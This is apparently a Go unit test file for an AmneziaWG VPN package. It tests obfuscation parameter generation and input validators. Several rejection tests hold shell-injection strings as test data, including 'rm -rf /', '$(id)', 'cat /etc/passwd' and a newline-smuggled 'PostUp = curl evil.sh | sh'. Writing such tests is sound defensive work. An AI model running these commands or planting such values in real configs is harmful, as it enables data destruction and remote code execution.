package amneziawg

import (
	"strconv"
	"strings"
	"testing"
)

func TestGenerateObfuscation20DefaultRanges(t *testing.T) {
	for i := 0; i < 200; i++ {
		o := GenerateObfuscation20("default")
		if o.Jc < 3 || o.Jc > 6 {
			t.Fatalf("Jc = %d, want [3,6]", o.Jc)
		}
		if o.Jmin < 40 || o.Jmin > 89 {
			t.Fatalf("Jmin = %d, want [40,89]", o.Jmin)
		}
		if o.Jmax < o.Jmin+50 || o.Jmax > o.Jmin+250 {
			t.Fatalf("Jmax = %d, want [Jmin+50, Jmin+250] (Jmin=%d)", o.Jmax, o.Jmin)
		}
		if o.S1 < 15 || o.S1 > 150 {
			t.Fatalf("S1 = %d, want [15,150]", o.S1)
		}
		if o.S2 < 15 || o.S2 > 150 {
			t.Fatalf("S2 = %d, want [15,150]", o.S2)
		}
		if o.S1+56 == o.S2 {
			t.Fatalf("S1+56 == S2 (%d+56 == %d): violates kernel constraint", o.S1, o.S2)
		}
		if o.S3 < 8 || o.S3 > 55 {
			t.Fatalf("S3 = %d, want [8,55]", o.S3)
		}
		if o.S4 < 4 || o.S4 > 27 {
			t.Fatalf("S4 = %d, want [4,27]", o.S4)
		}
		for name, h := range map[string]string{"H1": o.H1, "H2": o.H2, "H3": o.H3, "H4": o.H4} {
			if err := validateHValue(h); err != nil {
				t.Fatalf("%s = %q invalid: %v", name, h, err)
			}
			if h == "" {
				t.Fatalf("%s is empty, want a generated range", name)
			}
		}
		for name, i := range map[string]string{"I1": o.I1, "I2": o.I2, "I3": o.I3, "I4": o.I4, "I5": o.I5} {
			if !strings.HasPrefix(i, "<r ") || !strings.HasSuffix(i, ">") {
				t.Fatalf("%s = %q, want \"<r N>\" form", name, i)
			}
			n, err := strconv.Atoi(strings.TrimSuffix(strings.TrimPrefix(i, "<r "), ">"))
			if err != nil || n < 32 || n > 256 {
				t.Fatalf("%s = %q, embedded N must be an integer in [32,256]", name, i)
			}
		}
	}
}

func TestGenerateObfuscation20MobilePreset(t *testing.T) {
	for i := 0; i < 100; i++ {
		o := GenerateObfuscation20("mobile")
		if o.Jc != 3 {
			t.Fatalf("mobile preset: Jc = %d, want 3", o.Jc)
		}
		if o.Jmin < 30 || o.Jmin > 50 {
			t.Fatalf("mobile preset: Jmin = %d, want [30,50]", o.Jmin)
		}
		if o.Jmax < o.Jmin+20 || o.Jmax > o.Jmin+80 {
			t.Fatalf("mobile preset: Jmax = %d, want [Jmin+20, Jmin+80] (Jmin=%d)", o.Jmax, o.Jmin)
		}
	}
}

func TestGenerateHRangesNonOverlapping(t *testing.T) {
	for i := 0; i < 50; i++ {
		h := generateHRanges()
		var prevHi int64
		for i, r := range h {
			lo, hi, ok := strings.Cut(r, "-")
			if !ok {
				t.Fatalf("H%d = %q is not a range", i+1, r)
			}
			loN, _ := strconv.ParseInt(lo, 10, 64)
			hiN, _ := strconv.ParseInt(hi, 10, 64)
			if loN <= prevHi {
				t.Fatalf("H%d = %q overlaps or touches the previous range (prev high=%d)", i+1, r, prevHi)
			}
			if hiN-loN < hMinWidth {
				t.Fatalf("H%d = %q is narrower than hMinWidth=%d", i+1, r, hMinWidth)
			}
			prevHi = hiN
		}
	}
}

func validObfuscation() Obfuscation20 {
	return GenerateObfuscation20("default")
}

func TestValidateObfuscationAcceptsGenerated(t *testing.T) {
	for i := 0; i < 50; i++ {
		if err := ValidateObfuscation(validObfuscation()); err != nil {
			t.Fatalf("generated obfuscation set rejected: %v", err)
		}
	}
}

func TestValidateObfuscationAcceptsBlankH(t *testing.T) {
	o := validObfuscation()
	o.H1, o.H2, o.H3, o.H4 = "", "", "", ""
	if err := ValidateObfuscation(o); err != nil {
		t.Fatalf("blank H values should be allowed (fall back to defaults): %v", err)
	}
}

func TestValidateObfuscationRejectsBadJminJmax(t *testing.T) {
	o := validObfuscation()
	o.Jmin, o.Jmax = 50, 10
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("Jmin > Jmax must be rejected")
	}
}

func TestValidateObfuscationRejectsBadS3S4(t *testing.T) {
	o := validObfuscation()
	o.S3 = 65
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S3 > 64 must be rejected")
	}
	o = validObfuscation()
	o.S4 = 33
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S4 > 32 must be rejected")
	}
	o = validObfuscation()
	o.S3, o.S4 = -1, -1
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("negative S3/S4 must be rejected")
	}
}

func TestValidateObfuscationRejectsS1S2Collision(t *testing.T) {
	o := validObfuscation()
	o.S1 = 30
	o.S2 = o.S1 + 56
	if err := ValidateObfuscation(o); err == nil {
		t.Fatal("S1+56 == S2 must be rejected (kernel constraint)")
	}
}

func TestValidateObfuscationRejectsBadH(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "5-4", "-1-10"}
	for _, h := range cases {
		o := validObfuscation()
		o.H1 = h
		if err := ValidateObfuscation(o); err == nil {
			t.Fatalf("H1 = %q must be rejected", h)
		}
	}
}

func TestValidateHeaderProtectionAllowsEmptyKeyRegardlessOfS1S4(t *testing.T) {
	o := Obfuscation20{S1: 0, S2: 0, S3: 0, S4: 0}
	if err := ValidateHeaderProtection("", o); err != nil {
		t.Fatalf("an empty key must never be rejected, even with S1-S4 all 0: %v", err)
	}
}

func TestValidateHeaderProtectionRequiresS1ThroughS4AtLeast12(t *testing.T) {
	base := Obfuscation20{S1: 20, S2: 20, S3: 20, S4: 20}
	cases := []struct {
		name    string
		mutate  func(*Obfuscation20)
		wantNum int
	}{
		{"S1 too low", func(o *Obfuscation20) { o.S1 = 11 }, 1},
		{"S2 too low", func(o *Obfuscation20) { o.S2 = 11 }, 2},
		{"S3 too low", func(o *Obfuscation20) { o.S3 = 11 }, 3},
		{"S4 too low", func(o *Obfuscation20) { o.S4 = 0 }, 4},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			o := base
			c.mutate(&o)
			err := ValidateHeaderProtection("some-key", o)
			if err == nil {
				t.Fatalf("expected an error for %s", c.name)
			}
			want := "S" + strconv.Itoa(c.wantNum)
			if !strings.Contains(err.Error(), want) {
				t.Fatalf("error %q does not name the offending field %q", err.Error(), want)
			}
		})
	}
}

func TestValidateHeaderProtectionAcceptsExactly12(t *testing.T) {
	o := Obfuscation20{S1: 12, S2: 12, S3: 12, S4: 12}
	if err := ValidateHeaderProtection("some-key", o); err != nil {
		t.Fatalf("S1-S4 all exactly 12 must be accepted: %v", err)
	}
}

func TestValidateContentPaddingAdditionAcceptsSameGrammarAsH(t *testing.T) {
	for _, v := range []string{"", "0", "65535", "50-100", "0-65535"} {
		if err := ValidateContentPaddingAddition(v); err != nil {
			t.Errorf("ValidateContentPaddingAddition(%q) rejected a valid value: %v", v, err)
		}
	}
}

func TestValidateContentPaddingAdditionRejectsBadValues(t *testing.T) {
	cases := []string{"not-a-number", "10-", "-10", "100-50", "65536", "0-65536", "-1"}
	for _, v := range cases {
		if err := ValidateContentPaddingAddition(v); err == nil {
			t.Errorf("ValidateContentPaddingAddition(%q) must be rejected", v)
		}
	}
}

func TestValidateInterfaceNameAcceptsBlankAndPlausibleNames(t *testing.T) {
	for _, name := range []string{"", "eth0", "wg0", "br-lan", "eno1.100", "veth1a2b3c", "eth0:0"} {
		if err := ValidateInterfaceName(name); err != nil {
			t.Errorf("ValidateInterfaceName(%q) rejected a plausible name: %v", name, err)
		}
	}
}

func TestValidateInterfaceNameRejectsShellMetacharactersAndOverlength(t *testing.T) {
	cases := []string{
		"eth0 -j ACCEPT; rm -rf /",
		"eth0`whoami`",
		"eth0$(id)",
		"eth0|cat /etc/passwd",
		"eth0\nMASQUERADE",
		"aaaaaaaaaaaaaaaaaaaa", // 20 chars, over IFNAMSIZ-1
	}
	for _, name := range cases {
		if err := ValidateInterfaceName(name); err == nil {
			t.Errorf("ValidateInterfaceName(%q) must be rejected", name)
		}
	}
}

func TestValidateSubnetIPv4AcceptsValidBases(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0", 24},
		{"10.8.1.0", 0}, // cidr <= 0 defaults to /24, mirroring serverAddress
		{"192.168.5.10", 32},
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err != nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) rejected a valid subnet: %v", c.ip, c.cidr, err)
		}
	}
}

func TestValidateSubnetIPv4RejectsMalformedOrInjectedValues(t *testing.T) {
	cases := []struct {
		ip   string
		cidr int
	}{
		{"10.8.1.0 -j ACCEPT; rm -rf /", 24}, // shell injection attempt
		{"not-an-ip", 24},
		{"", 24},
		{"fd86::1", 64},  // IPv6, not IPv4
		{"10.8.1.0", 33}, // cidr out of range
	}
	for _, c := range cases {
		if err := ValidateSubnetIPv4(c.ip, c.cidr); err == nil {
			t.Errorf("ValidateSubnetIPv4(%q, %d) must be rejected", c.ip, c.cidr)
		}
	}
}

func TestValidateConfigValueAcceptsPlausibleValues(t *testing.T) {
	for _, v := range []string{"", "user@example.com", "MCPfRGcDGotJ6TcnIdDqsemj2cMIiGHnPUHM5ivXN18=", "<r 148>"} {
		if err := ValidateConfigValue("email", v); err != nil {
			t.Errorf("ValidateConfigValue(%q) rejected a plausible value: %v", v, err)
		}
	}
}

func TestValidateConfigValueRejectsControlCharacters(t *testing.T) {
	cases := []string{
		"a@x\nPostUp = curl evil.sh | sh",
		"a@x\r\n[Interface]",
		"tab\there",
		"a@x\x7f",
	}
	for _, v := range cases {
		if err := ValidateConfigValue("email", v); err == nil {
			t.Errorf("ValidateConfigValue(%q) must be rejected", v)
		}
	}
}
